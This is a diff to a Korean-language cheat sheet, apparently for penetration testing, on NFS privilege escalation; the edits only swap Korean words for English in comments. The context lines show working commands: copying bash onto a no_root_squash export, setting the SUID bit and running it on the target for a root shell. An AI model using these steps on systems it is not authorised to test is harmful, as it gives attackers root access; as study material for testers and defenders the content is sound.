@@ -51,10 +51,10 @@ umount /tmp/nfs
 # /share *(rw,no_root_squash)  → root 접근 가능
 # /share *(rw,root_squash)    → root → nfsnobody로 매핑됨
 
-# no_root_squash인 경우: SUID 바이너리 배치
+# no_root_squash인 경우: SUID binary 배치
 cp /bin/bash /tmp/nfs/bash
 chmod +s /tmp/nfs/bash
-# target에서: /share/bash -p → root 쉘
+# target에서: /share/bash -p → root shell
 ```
 
 ### UID/GID 스푸핑
@@ -142,9 +142,9 @@ mount -t nfs TARGET:/share /mnt/nfs
 cp /bin/bash /mnt/nfs/pwn
 chmod +s /mnt/nfs/pwn                     # SUID 비트 설정
 
-# target (NFS 서버 쉘, 일반 사용자)
+# target (NFS 서버 shell, 일반 사용자)
 /share/pwn -p
-# → euid=0(root) 쉘
+# → euid=0(root) shell
 ```
 
 ### root_squash 우회 (all_squash + anonuid=0)
